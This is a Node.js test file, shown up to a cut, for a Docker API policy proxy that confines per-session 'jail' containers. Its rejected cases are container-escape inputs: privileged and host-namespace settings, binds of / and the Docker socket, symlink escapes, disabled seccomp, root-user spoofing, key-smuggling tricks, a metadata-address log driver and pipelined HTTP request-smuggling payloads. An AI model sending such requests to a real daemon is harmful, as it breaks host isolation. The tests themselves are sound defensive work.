// install/test/docker-proxy-test.mjs — the Docker policy sidecar's rules
// (obj 901741, public issue #97). Run: node --test install/test/docker-proxy-test.mjs
//
// The proxy runs in-process against a FAKE Docker daemon on a unix socket, so
// this needs no Docker. scripts/docker-proxy-proof.sh proves the same rules
// against a real daemon with the real docker CLI (workflow "Session Jail Proof").
import assert from 'node:assert/strict'
import fs from 'node:fs'
import http from 'node:http'
import net from 'node:net'
import os from 'node:os'
import path from 'node:path'
import { after, before, describe, it } from 'node:test'
import { fileURLToPath } from 'node:url'

const here = path.dirname(fileURLToPath(import.meta.url))
const { createProxy } = await import(path.join(here, '../docker-proxy/server.mjs'))
const policy = await import(path.join(here, '../docker-proxy/policy.mjs'))

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'ok-docker-proxy-'))
const STATE = path.join(tmp, 'state')
fs.mkdirSync(path.join(STATE, 'tmp/cc-worktree-7'), { recursive: true })
fs.mkdirSync(path.join(STATE, 'home/sandboxes/7'), { recursive: true })
fs.symlinkSync('/', path.join(STATE, 'tmp/escape'))            // a worker-made symlink to /
fs.symlinkSync('../../..', path.join(STATE, 'tmp/escape-rel'))  // and a relative one
const SOCK = path.join(tmp, 'docker.sock')
const AUDIT = path.join(tmp, 'audit.jsonl')
const SCRIPT = '#!/usr/bin/env bash\necho host runner\n'
fs.writeFileSync(path.join(tmp, 'host-runner.sh'), SCRIPT)
// The browser jail's profile as a file the sidecar is configured with (compose
// mounts app/server/src/lib/jail-browser-seccomp.json the same way).
const SECCOMP = { defaultAction: 'SCMP_ACT_ERRNO', syscalls: [{ names: ['chroot', 'unshare'], action: 'SCMP_ACT_ALLOW' }] }
fs.writeFileSync(path.join(tmp, 'seccomp.json'), JSON.stringify(SECCOMP, null, 2))

// ── fake daemon ──────────────────────────────────────────────────────────────
const containers = {
  'ok-jail-7': { Id: 'a'.repeat(64), Name: '/ok-jail-7', Config: { Labels: { 'ok.objective': '7', 'ok.session': 's7' } } },
  'command-center': { Id: 'b'.repeat(64), Name: '/command-center', Config: { Labels: { 'com.docker.compose.service': 'command-center' } } },
  'ok-dev-ops-deploy-9': { Id: 'c'.repeat(64), Name: '/ok-dev-ops-deploy-9', Config: { Labels: { 'ok.host-runner': '1' } } },
}
const byId = id => containers[id] ?? Object.values(containers).find(c => c.Id === id || c.Id.startsWith(id))
const execs = { e1: 'a'.repeat(64), e2: 'b'.repeat(64), e404: 'a'.repeat(64) }
const received = []
const daemon = http.createServer((req, res) => {
  const chunks = []
  req.on('data', c => chunks.push(c))
  req.on('end', () => {
    const body = Buffer.concat(chunks).toString('utf8')
    received.push({ method: req.method, url: req.url, body })
    const p = req.url.split('?')[0].replace(/^\/v[0-9.]+/, '')
    const send = (code, obj) => { const b = obj === undefined ? '' : JSON.stringify(obj); res.writeHead(code, { 'Content-Type': 'application/json' }); res.end(b) }
    let m
    if (p === '/_ping') return send(200, 'OK')
    if (p === '/containers/json') return send(200, Object.values(containers).map(c => ({ Id: c.Id, Names: [c.Name], Labels: c.Config.Labels })))
    if (p === '/containers/create') return send(201, { Id: 'f'.repeat(64), Warnings: [] })
    if ((m = p.match(/^\/containers\/([^/]+)\/json$/))) { const c = byId(m[1]); return c ? send(200, c) : send(404, { message: `No such container: ${m[1]}` }) }
    if ((m = p.match(/^\/containers\/([^/]+)\/exec$/))) return send(201, { Id: 'e1' })
    if (/\/wait$/.test(p) && req.url.includes('condition=next-exit')) {
      // Like dockerd: headers flushed at once, the body only when the container exits.
      res.writeHead(200, { 'Content-Type': 'application/json' }); res.flushHeaders()
      setTimeout(() => res.end('{"StatusCode":0}'), 3000)
      return
    }
    if ((m = p.match(/^\/containers\/([^/]+)$/)) && req.method === 'DELETE') return send(204)
    if ((m = p.match(/^\/exec\/([^/]+)\/json$/))) return execs[m[1]] ? send(200, { ID: m[1], ContainerID: execs[m[1]], ExitCode: 0 }) : send(404, { message: 'No such exec instance' })
    return send(200, {})
  })
})
// exec start: answer 101 and echo the stream back, like a hijacked TTY.
const afterNoHijack = []
daemon.on('upgrade', (req, sock, head) => {
  received.push({ method: req.method, url: req.url, upgrade: true })
  if (req.url.includes('/exec/e404/')) {
    // A daemon that answers WITHOUT hijacking and would read on: record what follows.
    sock.write('HTTP/1.1 409 Conflict\r\nContent-Type: application/json\r\nContent-Length: 31\r\n\r\n{"message":"container stopped"}')
    if (head?.length) afterNoHijack.push(head.toString())
    sock.on('data', d => afterNoHijack.push(d.toString()))
    return
  }
  sock.write('HTTP/1.1 101 UPGRADED\r\nContent-Type: application/vnd.docker.raw-stream\r\nConnection: Upgrade\r\nUpgrade: tcp\r\n\r\n')
  if (head?.length) sock.write(head)
  sock.pipe(sock)
})

function makeProxy(extra = {}) {
  const env = {
    DOCKER_PROXY_BIND_ROOTS: STATE,
    DOCKER_PROXY_NETWORKS: 'ok-jails',
    DOCKER_PROXY_SECCOMP_PROFILES: path.join(tmp, 'seccomp.json'),
    DOCKER_PROXY_HOST_RUNNER: extra.hostRunner ? 'on' : 'off',
    DOCKER_PROXY_HOST_RUNNER_SCRIPT: path.join(tmp, 'host-runner.sh'),
    DOCKER_PROXY_HOST_RUNNER_SRC: '/opt/operationkit-src',
    DOCKER_PROXY_HOST_RUNNER_CONF: '/opt/operationkit-src/client.conf',
    DOCKER_PROXY_HOST_RUNNER_DATA: `${STATE}/data`,
  }
  return createProxy({ env, upstream: SOCK, auditLog: AUDIT, quiet: true })
}

let proxy, proxyHR, port, portHR
before(async () => {
  await new Promise(r => daemon.listen(SOCK, r))
  proxy = makeProxy().server
  proxyHR = makeProxy({ hostRunner: true }).server
  await new Promise(r => proxy.listen(0, '127.0.0.1', r))
  await new Promise(r => proxyHR.listen(0, '127.0.0.1', r))
  port = proxy.address().port
  portHR = proxyHR.address().port
})
after(() => { proxy.close(); proxyHR.close(); daemon.close(); fs.rmSync(tmp, { recursive: true, force: true }) })

function call(method, url, body, p = port, rawBody) {
  return new Promise((res, rej) => {
    const data = rawBody ?? (body === undefined ? undefined : JSON.stringify(body))
    const r = http.request({ host: '127.0.0.1', port: p, method, path: url, headers: data ? { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } : {} }, resp => {
      const chunks = []
      resp.on('data', c => chunks.push(c))
      resp.on('end', () => {
        const text = Buffer.concat(chunks).toString('utf8')
        let json; try { json = JSON.parse(text) } catch { json = undefined }
        res({ status: resp.statusCode, text, json })
      })
    })
    r.on('error', rej)
    if (data) r.write(data)
    r.end()
  })
}

/** What `docker run` sends for buildJailRunArgv (session-jail.ts), docker CLI 27. */
function jailBody(over = {}, hcOver = {}) {
  return {
    Hostname: '', Domainname: '', User: '1000:1000', AttachStdin: false, AttachStdout: false, AttachStderr: false,
    Tty: false, OpenStdin: false, StdinOnce: false, Env: ['CLAUDE_CODE_TMPDIR=/home/jailuser/.tmp'], Cmd: null,
    Image: 'ok-jail:local', Volumes: null, WorkingDir: '/workspace', Entrypoint: null, OnBuild: null,
    Labels: { 'ok.objective': '7', 'ok.session': 's7' },
    HostConfig: {
      Binds: null, ContainerIDFile: '', LogConfig: { Type: '', Config: {} }, NetworkMode: 'ok-jails', PortBindings: {},
      RestartPolicy: { Name: 'no', MaximumRetryCount: 0 }, AutoRemove: false, VolumeDriver: '', VolumesFrom: null,
      ConsoleSize: [0, 0], CapAdd: null, CapDrop: ['ALL'], CgroupnsMode: '', Dns: [], DnsOptions: [], DnsSearch: [],
      ExtraHosts: null, GroupAdd: null, IpcMode: '', Cgroup: '', Links: null, OomScoreAdj: 0, PidMode: '',
      Privileged: false, PublishAllPorts: false, ReadonlyRootfs: true, SecurityOpt: ['no-new-privileges'],
      Tmpfs: { '/tmp': 'rw,nosuid,nodev,size=2g' }, UTSMode: '', UsernsMode: '', ShmSize: 0, Isolation: '',
      CpuShares: 0, Memory: 0, NanoCpus: 0, CgroupParent: '', BlkioWeight: 0, BlkioWeightDevice: [], Devices: [],
      DeviceCgroupRules: null, DeviceRequests: null, MemoryReservation: 0, MemorySwap: 0, MemorySwappiness: null,
      OomKillDisable: null, PidsLimit: null, Ulimits: [], MaskedPaths: null, ReadonlyPaths: null,
      Mounts: [
        { Type: 'bind', Source: `${STATE}/tmp/cc-worktree-7`, Target: '/workspace', BindOptions: { Propagation: 'rprivate' } },
        { Type: 'bind', Source: `${STATE}/home/sandboxes/7`, Target: '/home/jailuser', BindOptions: { Propagation: 'rprivate' } },
      ],
      ...hcOver,
    },
    NetworkingConfig: { EndpointsConfig: { 'ok-jails': {} } },
    ...over,
  }
}
const CREATE = '/v1.47/containers/create?name=ok-jail-7'

describe('container create: rejected', () => {
  const cases = [
    ['privileged', jailBody({}, { Privileged: true })],
    ['CapAdd SYS_ADMIN', jailBody({}, { CapAdd: ['SYS_ADMIN'] })],
    ['host network', jailBody({ NetworkingConfig: {} }, { NetworkMode: 'host' })],
    ['another container\'s network', jailBody({ NetworkingConfig: {} }, { NetworkMode: 'container:command-center' })],
    ['host pid', jailBody({}, { PidMode: 'host' })],
    ['host ipc', jailBody({}, { IpcMode: 'host' })],
    ['host uts', jailBody({}, { UTSMode: 'host' })],
    ['host userns', jailBody({}, { UsernsMode: 'host' })],
    ['host cgroupns', jailBody({}, { CgroupnsMode: 'host' })],
    ['a device', jailBody({}, { Devices: [{ PathOnHost: '/dev/sda', PathInContainer: '/dev/sda', CgroupPermissions: 'rwm' }] })],
    ['a GPU request', jailBody({}, { DeviceRequests: [{ Driver: 'nvidia', Count: -1 }] })],
    ['bind of / (Binds)', jailBody({}, { Binds: ['/:/host'] })],
    ['bind of / (Mounts)', jailBody({}, { Mounts: [{ Type: 'bind', Source: '/', Target: '/host' }] })],
    ['bind of the docker socket', jailBody({}, { Binds: ['/var/run/docker.sock:/var/run/docker.sock'] })],
    ['bind of /etc', jailBody({}, { Mounts: [{ Type: 'bind', Source: '/etc', Target: '/etc2' }] })],
    ['bind via a symlink to /', jailBody({}, { Mounts: [{ Type: 'bind', Source: `${STATE}/tmp/escape`, Target: '/x' }] })],
    ['bind via a relative symlink out', jailBody({}, { Mounts: [{ Type: 'bind', Source: `${STATE}/tmp/escape-rel`, Target: '/x' }] })],
    ['bind with .. out of OK_STATE', jailBody({}, { Binds: [`${STATE}/tmp/../../../etc:/x`] })],
    ['named volume', jailBody({}, { Mounts: [{ Type: 'volume', Source: 'evil', Target: '/x', VolumeOptions: { DriverConfig: { Name: 'local', Options: { type: 'none', o: 'bind', device: '/' } } } }] })],
    ['shared propagation', jailBody({}, { Mounts: [{ Type: 'bind', Source: `${STATE}/tmp/cc-worktree-7`, Target: '/w', BindOptions: { Propagation: 'rshared' } }] })],
    ['published port', jailBody({}, { PortBindings: { '22/tcp': [{ HostIp: '0.0.0.0', HostPort: '2222' }] } })],
    ['volumes-from', jailBody({}, { VolumesFrom: ['command-center'] })],
    ['sysctl', jailBody({}, { Sysctls: { 'kernel.shm_rmid_forced': '1' } })],
    ['unmasked /proc', jailBody({}, { MaskedPaths: [], ReadonlyPaths: [] })],
    ['seccomp unconfined', jailBody({}, { SecurityOpt: ['no-new-privileges', 'seccomp=unconfined'] })],
    ['apparmor unconfined', jailBody({}, { SecurityOpt: ['no-new-privileges', 'apparmor=unconfined'] })],
    ['allow-all seccomp profile', jailBody({}, { SecurityOpt: ['no-new-privileges', 'seccomp={"defaultAction":"SCMP_ACT_ALLOW"}'] })],
    ['no no-new-privileges', jailBody({}, { SecurityOpt: [] })],
    ['no CapDrop ALL', jailBody({}, { CapDrop: ['NET_RAW'] })],
    ['writable root fs', jailBody({}, { ReadonlyRootfs: false })],
    ['root user', jailBody({ User: '0:0' })],
    ['root via "00" (Go Atoi)', jailBody({ User: '00' })],
    ['root via "+0"', jailBody({ User: '+0:1000' })],
    ['root group via "1000:-0"', jailBody({ User: '1000:-0' })],
    ['a port published with a blank binding (review #3)', jailBody({}, { PortBindings: { '22/tcp': [{}] } })],
    ['an anonymous volume with a blank value (review #3)', jailBody({ Volumes: { '/data': {} } })],
    ['a device request with blank capabilities (review #3)', jailBody({}, { DeviceRequests: [{ Capabilities: [[]] }] })],
    ['a sysctl with a blank value', jailBody({}, { Sysctls: { 'net.ipv4.ip_forward': '' } })],
    ['seccomp folded duplicate key (review #4)', jailBody({}, { SecurityOpt: ['no-new-privileges', 'seccomp={"defaultAction":"SCMP_ACT_ERRNO","DEFAULTACTION":"SCMP_ACT_ALLOW"}'] })],
    ['seccomp SCMP_ACT_LOG default (review #4)', jailBody({}, { SecurityOpt: ['no-new-privileges', 'seccomp={"defaultAction":"SCMP_ACT_LOG"}'] })],
    ['a seccomp profile this install does not ship', jailBody({}, { SecurityOpt: ['no-new-privileges', 'seccomp={"defaultAction":"SCMP_ACT_ERRNO","syscalls":[{"names":["mount"],"action":"SCMP_ACT_ALLOW"}]}'] })],
    ['a one-part bind (an anonymous volume)', jailBody({}, { Binds: [`${STATE}/tmp/cc-worktree-7`] })],
    ['root group', jailBody({ User: '1000:0' })],
    ['a log driver that dials out from the daemon', jailBody({}, { LogConfig: { Type: 'gelf', Config: { 'gelf-address': 'udp://169.254.169.254:12201' } } })],
    ['log driver options', jailBody({}, { LogConfig: { Type: 'json-file', Config: { 'max-size': '1g' } } })],
    ['image default user', jailBody({ User: '' })],
    ['unlisted image', jailBody({ Image: 'alpine:latest' })],
    ['missing jail label', jailBody({ Labels: { 'ok.session': 's7' } })],
    ['restart always', jailBody({}, { RestartPolicy: { Name: 'always', MaximumRetryCount: 0 } })],
    ['a runtime', jailBody({}, { Runtime: 'runsc-debug' })],
    ['an unknown future HostConfig field', jailBody({}, { SomethingNew: { Escape: true } })],
    ['lower-case hostconfig smuggling privileged', { ...jailBody(), hostconfig: { privileged: true } }],
    ['lower-case field inside HostConfig', jailBody({}, { privileged: true })],
    ['Unicode-folded key (ſource)', jailBody({}, { Mounts: [{ Type: 'bind', Source: `${STATE}/tmp/cc-worktree-7`, 'ſource': '/', Target: '/w' }] })],
    ['case-duplicate key', jailBody({}, { Mounts: [{ Type: 'bind', Source: `${STATE}/tmp/cc-worktree-7`, source: '/', Target: '/w' }] })],
  ]
  for (const [label, body] of cases) {
    it(label, async () => {
      const before = received.length
      const r = await call('POST', CREATE, body)
      assert.equal(r.status, 403, `${label}: ${r.text}`)
      assert.match(r.json.message, /^docker-proxy: /)
      assert.equal(received.slice(before).some(x => x.url.includes('/containers/create')), false, 'nothing reached the daemon')
    })
  }

  it('a name that is not ok-jail-<id>', async () => {
    const r = await call('POST', '/v1.47/containers/create?name=command-center2', jailBody())
    assert.equal(r.status, 403)
    assert.match(r.json.message, /container name must be ok-jail-/)
  })

  it('a duplicate HostConfig key is not merged: the daemon gets the checked body only', async () => {
    // Go would MERGE these two objects (Privileged from the first survives);
    // JSON.parse keeps the second. The proxy forwards its own serialisation.
    const valid = JSON.stringify(jailBody().HostConfig)
    const raw = JSON.stringify(jailBody()).replace('"HostConfig":', '"HostConfig":{"Privileged":true,"Binds":["/:/host"]},"HostConfig":')
    assert.ok(raw.includes('"Privileged":true') && raw.includes(valid))
    const before = received.length
    const r = await call('POST', CREATE, undefined, port, raw)
    assert.equal(r.status, 201, r.text)
    const sent = received.slice(before).find(x => x.url.includes('/containers/create'))
    assert.ok(sent)
    assert.equal(JSON.parse(sent.body).HostConfig.Privileged, false)
    assert.equal(sent.body.includes('/:/host'), false)
    assert.equal((sent.body.match(/"HostConfig"/g) || []).length, 1)
  })
})

describe('old API versions are refused (review #7, #8)', () => {
  it('/v1.23 start (takes a HostConfig body) and /v1.40 create (host cgroupns default)', async () => {
    assert.equal((await call('POST', '/v1.23/containers/ok-jail-7/start')).status, 403)
    assert.equal((await call('POST', '/v1.40/containers/create?name=ok-jail-7', jailBody())).status, 403)
    assert.equal((await call('POST', '/v1.41/containers/create?name=ok-jail-7', jailBody())).status, 201)
  })
  it('a start with a body is refused (no HostConfig at start)', async () => {
    const before = received.length
    const r = await call('POST', '/v1.47/containers/ok-jail-7/start', { Privileged: true, Binds: ['/:/host'] })
    assert.equal(r.status, 400)
    assert.equal(received.slice(before).some(x => /\/start/.test(x.url)), false)
  })
  it('an empty CgroupnsMode is pinned to private before Docker sees it', async () => {
    const before = received.length
    assert.equal((await call('POST', CREATE, jailBody())).status, 201)
    const sent = received.slice(before).find(x => x.url.includes('/containers/create'))
    assert.equal(JSON.parse(sent.body).HostConfig.CgroupnsMode, 'private')
  })
})

describe('container create: the real jail shapes still work', () => {
  it('a card jail (session-jail.ts buildJailRunArgv)', async () => {
    const r = await call('POST', CREATE, jailBody())
    assert.equal(r.status, 201, r.text)
  })
  it('a browser jail with its seccomp profile, a git mount set and a seat login', async () => {
    const seccomp = JSON.stringify(SECCOMP) // the docker CLI sends the file json.Compact-ed
    const body = jailBody({ Image: 'ok-jail-browser:local' }, {
      SecurityOpt: ['no-new-privileges', `seccomp=${seccomp}`],
      Mounts: [
        ...jailBody().HostConfig.Mounts,
        { Type: 'tmpfs', Target: `${STATE}/home/projects/x/.git/worktrees`, TmpfsOptions: { SizeBytes: 1048576, Mode: 493 } },
        { Type: 'bind', Source: `${STATE}/home/sandboxes/7`, Target: '/home/jailuser/.codex', ReadOnly: true, BindOptions: { Propagation: 'rprivate' } },
      ],
    })
    const r = await call('POST', CREATE, body)
    assert.equal(r.status, 201, r.text)
  })
  it('legacy -v binds inside OK_STATE', async () => {
    const r = await call('POST', CREATE, jailBody({}, { Binds: [`${STATE}/tmp/cc-worktree-7:/workspace:rw`], Mounts: null }))
    assert.equal(r.status, 201, r.text)
  })
})

describe('per-container calls need the jail label', () => {
  it('exec on an unlabelled container is denied', async () => {
    const r = await call('POST', '/v1.47/containers/command-center/exec', { Cmd: ['sh'], AttachStdout: true })
    assert.equal(r.status, 403)
    assert.match(r.json.message, /no jail label/)
  })
  it('rm on an unlabelled container is denied', async () => {
    const before = received.length
    const r = await call('DELETE', '/v1.47/containers/command-center?force=1')
    assert.equal(r.status, 403)
    assert.equal(received.slice(before).some(x => x.method === 'DELETE'), false)
  })
  it('start / stop / kill / logs / inspect on an unlabelled container are denied', async () => {
    for (const [m, u] of [['POST', 'start'], ['POST', 'stop'], ['POST', 'kill'], ['GET', 'logs'], ['GET', 'json'], ['POST', 'attach'], ['POST', 'wait']]) {
      const r = await call(m, `/v1.47/containers/command-center/${u}`)
      assert.equal(r.status, 403, `${m} ${u}`)
    }
  })
  it('exec / rm / inspect / logs on a jail are allowed', async () => {
    assert.equal((await call('POST', '/v1.47/containers/ok-jail-7/exec', { Cmd: ['tmux', 'ls'], User: '65000:65000' })).status, 201)
    assert.equal((await call('DELETE', '/v1.47/containers/ok-jail-7?force=1')).status, 204)
    assert.equal((await call('GET', '/v1.47/containers/ok-jail-7/json')).status, 200)
    assert.equal((await call('GET', '/v1.47/containers/ok-jail-7/logs?stdout=1')).status, 200)
  })
  it('start re-checks the bind sources: a worktree swapped for a symlink to / is refused', async () => {
    containers['ok-jail-8'] = { Id: 'd'.repeat(64), Name: '/ok-jail-8', Config: { Labels: { 'ok.objective': '8' } }, HostConfig: { Mounts: [{ Type: 'bind', Source: `${STATE}/tmp/cc-worktree-8`, Target: '/workspace' }] } }
    fs.mkdirSync(path.join(STATE, 'tmp/cc-worktree-8'))
    assert.equal((await call('POST', '/v1.47/containers/ok-jail-8/start')).status, 200)
    fs.rmdirSync(path.join(STATE, 'tmp/cc-worktree-8'))
    fs.symlinkSync('/', path.join(STATE, 'tmp/cc-worktree-8'))
    const r = await call('POST', '/v1.47/containers/ok-jail-8/start')
    assert.equal(r.status, 403)
    assert.match(r.json.message, /at start: bind source .* resolves to \//)
  })
  it('a jail that already ran cannot be started again', async () => {
    containers['ok-jail-9'] = { Id: 'e'.repeat(64), Name: '/ok-jail-9', Config: { Labels: { 'ok.objective': '9' } }, State: { StartedAt: '2026-11-23T05:00:00Z' }, HostConfig: {} }
    const r = await call('POST', '/v1.47/containers/ok-jail-9/start')
    assert.equal(r.status, 403)
    assert.match(r.json.message, /started only once/)
  })
  it('a wait\'s headers reach the client at once (docker run CLI 29 sends start only after them)', async () => {
    const t0 = Date.now()
    const ms = await new Promise((res, rej) => {
      const r = http.request({ host: '127.0.0.1', port, method: 'POST', path: '/v1.47/containers/ok-jail-7/wait?condition=next-exit' }, resp => { res(Date.now() - t0); resp.resume() })
      r.on('error', rej); r.end()
    })
    assert.ok(ms < 1500, `headers took ${ms} ms`)
  })
  it('a missing container answers the daemon\'s own 404 (rm -f stays quiet)', async () => {
    const r = await call('DELETE', '/v1.47/containers/ok-jail-404?force=1')
    assert.equal(r.status, 404)
  })
  it('exec as root or privileged exec on a jail is denied', async () => {
    assert.equal((await call('POST', '/v1.47/containers/ok-jail-7/exec', { Cmd: ['sh'], User: 'root' })).status, 403)
    assert.equal((await call('POST', '/v1.47/containers/ok-jail-7/exec', { Cmd: ['sh'], User: '0' })).status, 403)
    assert.equal((await call('POST', '/v1.47/containers/ok-jail-7/exec', { Cmd: ['sh'], Privileged: true })).status, 403)
    assert.equal((await call('POST', '/v1.47/containers/ok-jail-7/exec', { Cmd: ['sh'], privileged: true })).status, 403)
  })
  it('exec inspect / start follow the exec to its container', async () => {
    assert.equal((await call('GET', '/v1.47/exec/e1/json')).status, 200)
    assert.equal((await call('GET', '/v1.47/exec/e2/json')).status, 403)
    assert.equal((await call('POST', '/v1.47/exec/e2/start', { Detach: false })).status, 403)
    assert.equal((await call('POST', '/v1.47/exec/e1/start', { Detach: true })).status, 200)
    assert.equal((await call('POST', '/v1.47/exec/e1/start', { Detach: true, Privileged: true })).status, 403)
  })
  it('the host runner label counts only when the host runner is on', async () => {
    assert.equal((await call('POST', '/v1.47/containers/ok-dev-ops-deploy-9/wait')).status, 403)
    assert.equal((await call('POST', '/v1.47/containers/ok-dev-ops-deploy-9/wait', undefined, portHR)).status, 200)
  })
  it('never an exec into a host runner, even with HOST_RUNNER on (it would be host root)', async () => {
    const r = await call('POST', '/v1.47/containers/ok-dev-ops-deploy-9/exec', { Cmd: ['bash'], User: '1000' }, portHR)
    assert.equal(r.status, 403)
    assert.match(r.json.message, /not allowed on the Dev host runner/)
    execs.e3 = 'c'.repeat(64)
    assert.equal((await call('POST', '/v1.47/exec/e3/start', { Detach: true }, portHR)).status, 403)
  })
})

/** A hijacked exec start, like `docker exec -it`. */
function upgradeExec(execId) {
  return new Promise((res, rej) => {
    const s = net.connect(port, '127.0.0.1', () => {
      const body = '{"Detach":false,"Tty":true}'
      s.write(`POST /v1.47/exec/${execId}/start HTTP/1.1\r\nHost: api.moby.localhost\r\nContent-Type: application/json\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nContent-Length: ${body.length}\r\n\r\n${body}`)
    })
    let buf = ''
    s.on('data', d => {
      buf += d
      if (buf.includes('101 UPGRADED') && !buf.includes('PING')) s.write('PING')
      if (buf.includes('PING') || /HTTP\/1\.1 403/.test(buf)) { s.end(); res(buf) }
    })
    s.on('error', rej)
    s.on('close', () => res(buf))
  })
}

describe('hijacked streams (docker exec -it, docker run -i)', () => {
  it('exec start on a jail is spliced through', async () => {
    const out = await upgradeExec('e1')
    assert.match(out, /101 UPGRADED/)
    assert.match(out, /PING/)
  })
  it('exec start on an unlabelled container is refused before the daemon sees it', async () => {
    const out = await upgradeExec('e2')
    assert.match(out, /HTTP\/1\.1 403/)
    assert.match(out, /docker-proxy: exec belongs to a container without the jail label/)
  })
})

function rawExchange(text, waitMs = 300) {
  return new Promise((res, rej) => {
    const s = net.connect(port, '127.0.0.1', () => s.write(text))
    let buf = ''
    s.on('data', d => { buf += d })
    s.on('error', rej)
    setTimeout(() => { s.destroy(); res(buf) }, waitMs)
    s.on('close', () => res(buf))
  })
}

describe('no request smuggling through the stream splice', () => {
  const smuggled = JSON.stringify(jailBody({}, { Privileged: true, Binds: ['/:/host'] }))
  const createReq = `POST /v1.47/containers/create?name=ok-jail-7 HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(smuggled)}\r\n\r\n${smuggled}`
  it('a request pipelined behind a stream start Docker did NOT hijack never reaches Docker', async () => {
    const body = '{"Detach":false,"Tty":true}'
    const before = received.length
    const out = await rawExchange(`POST /v1.47/exec/e404/start HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nContent-Length: ${body.length}\r\n\r\n${body}${createReq}`)
    assert.match(out, /409 Conflict/)
    assert.equal(afterNoHijack.join('').includes('containers/create'), false, 'the pipelined create was written to Docker')
    assert.equal(received.slice(before).some(x => x.url.includes('/containers/create')), false)
  })
  it('a request hidden in a GET body never reaches Docker (review #1)', async () => {
    const before = received.length
    const hidden = createReq
    const out = await rawExchange(`GET /_ping HTTP/1.1\r\nHost: x\r\nContent-Length: ${Buffer.byteLength(hidden)}\r\n\r\n${hidden}`)
    assert.match(out, /HTTP\/1\.1 400/)
    assert.match(out, /takes no request body/)
    assert.equal(received.slice(before).some(x => x.url.includes('/containers/create') || x.url.includes('_ping')), false)
  })
  it('a request hidden in a DELETE body on a jail never reaches Docker (review #1)', async () => {
    const before = received.length
    const out = await rawExchange(`DELETE /v1.47/containers/ok-jail-7?force=1 HTTP/1.1\r\nHost: x\r\nContent-Length: ${Buffer.byteLength(createReq)}\r\n\r\n${createReq}`)
    assert.match(out, /HTTP\/1\.1 400/)
    assert.equal(received.slice(before).some(x => x.method === 'DELETE' || x.url.includes('/containers/create')), false)
  })
  it('a chunked body on an allowed GET is refused too', async () => {
    const out = await rawExchange(`GET /v1.47/version HTTP/1.1\r\nHost: x\r\nTransfer-Encoding: chunked\r\n\r\n5\r\nhello\r\n0\r\n\r\n`)
    assert.match(out, /HTTP\/1\.1 400/)
  })
  it('a stream exec start body with an extra field is refused', async () => {
    const body = '{"Detach":false,"Tty":true,"Privileged":true}'
    const out = await rawExchange(`POST /v1.47/exec/e1/start HTTP/1.1\r\nHost: x\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nContent-Length: ${body.length}\r\n\r\n${body}`)
    assert.match(out, /HTTP\/1\.1 403/)
  })
  it('Upgrade on a non-stream route (DELETE a jail) is refused, so nothing is spliced', async () => {
    const before = received.length
    const out = await rawExchange(`DELETE /v1.47/containers/ok-jail-7?force=1 HTTP/1.1\r\nHost: x\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nContent-Length: 0\r\n\r\n${createReq}`)
    assert.match(out, /HTTP\/1\.1 403/)
    assert.match(out, /cannot be an upgrade/)
    assert.equal(received.slice(before).some(x => x.method === 'DELETE' || x.url.includes('/containers/create')), false)
  })
  it('a chunked stream request is refused', async () => {
    const out = await rawExchange('POST /v1.47/exec/e1/start HTTP/1.1\r\nHost: x\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n')
    assert.match(out, /HTTP\/1\.1 400/)
  })
  it('keep-alive pipelining on the normal path: every request is checked on its own', async () => {
    const before = received.length
    const out = await rawExchange(`GET /_ping HTTP/1.1\r\nHost: x\r\n\r\n${createReq}`)
    assert.match(out, /HTTP\/1\.1 200/)
    assert.match(out, /HTTP\/1\.1 403/)
    assert.equal(received.slice(before).some(x => x.url.includes('/containers/create')), false)
  })
})

describe('docker ps lists only labelled containers', () => {
  it('filters the daemon\'s answer', async () => {
    const r = await call('GET', '/v1.47/containers/json?filters=%7B%22label%22%3A%5B%22ok.session%22%5D%7D')
    assert.equal(r.status, 200)
    const names = r.json.map(c => c.Names[0])
    assert.ok(names.includes('/ok-jail-7'))
    assert.ok(!names.includes('/command-center'))
    assert.ok(!names.includes('/ok-dev-ops-deploy-9'), 'host runner containers are listed only when HOST_RUNNER is on')
  })
})

describe('only the endpoints the app uses', () => {
  const denied = [
    ['POST', '/v1.47/images/create?fromImage=alpine'], ['POST', '/v1.47/build'], ['GET', '/v1.47/info'],
    ['POST', '/v1.47/networks/create'], ['POST', '/v1.47/networks/ok-jails/connect'], ['POST', '/v1.47/volumes/create'],
    ['PUT', '/v1.47/containers/ok-jail-7/archive?path=/'], ['GET', '/v1.47/containers/ok-jail-7/archive?path=/'],
    ['POST', '/v1.47/containers/ok-jail-7/update'], ['POST', '/v1.47/containers/ok-jail-7/commit'], ['POST', '/v1.47/commit?container=ok-jail-7'],
    ['GET', '/v1.47/containers/ok-jail-7/export'], ['POST', '/v1.47/swarm/init'], ['POST', '/v1.47/plugins/pull'],
    ['POST', '/v1.47/session'], ['POST', '/v1.47/containers/prune'], ['DELETE', '/v1.47/images/ok-jail:local'],
    ['GET', '/v1.47/events'], ['POST', '/v1.47/containers/ok-jail-7/../../images/create'], ['POST', '/v1.47/containers/x%2F..%2F..%2Fbuild/start'],
    ['POST', '//containers/create'],
  ]
  for (const [m, u] of denied) {
    it(`${m} ${u}`, async () => {
      const r = await call(m, u)
      assert.equal(r.status, 403, r.text)
    })
  }
  it('ping, version and image inspect are allowed', async () => {
    assert.equal((await call('GET', '/_ping')).status, 200)
    assert.equal((await call('HEAD', '/_ping')).status, 200)
    assert.equal((await call('GET', '/v1.47/version')).status, 200)
    assert.equal((await call('GET', '/v1.47/images/ok-jail-browser:local/json')).status, 200)
  })
})

describe('the Dev host runner (privileged nsenter) is off unless configured, and pinned when on', () => {
  const hr = (over = {}, args = ['src-info', '/opt/operationkit-src', '/opt/operationkit-src/client.conf'], script = SCRIPT) => ({
    Image: 'operationkit-app:local', Entrypoint: ['nsenter'], AttachStdin: true, OpenStdin: true, StdinOnce: true,
    Cmd: ['-t', '1', '-m', '-u', '-i', '-n', '-p', '--', 'bash', '-c', script, 'ok-dev-ops', ...args],
    Labels: { 'ok.host-runner': '1' },
    // MemorySwappiness: -1 is what the real docker CLI 27 sends (caught live, obj 901741).
